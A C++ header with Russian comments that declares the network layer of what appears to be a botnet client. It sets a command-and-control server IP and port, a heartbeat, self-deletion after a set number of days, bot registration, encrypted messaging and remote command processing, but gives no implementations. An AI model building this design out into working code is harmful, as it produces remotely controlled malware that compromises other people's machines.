// Core/network.h
#pragma once

// ВАЖНО: winsock2.h должен идти ДО windows.h, иначе будет конфликт определений
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>      // <- ДОБАВЛЕНО: для std::vector<uint8_t>

// Структура конфига
struct Config {
    std::string c2_ip;
    int c2_port;
    int heartbeat_interval;
    int auto_delete_days;
};

// Async sender functions
void init_network_async();
void shutdown_network_async();
void push_to_send_queue(const std::vector<uint8_t>& data, int priority = 1);

// Legacy network functions
bool init_winsock();
void cleanup_winsock();
SOCKET connect_to_server(const std::string& ip, int port);
void send_encrypted(SOCKET sock, const std::string& data);
std::string recv_encrypted_line(SOCKET sock);
void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id);
void heartbeat_loop(SOCKET& sock, const Config& cfg);

// Command processing
void process_command(const std::string& cmd, SOCKET sock);

// Global bot ID
extern std::string g_bot_id;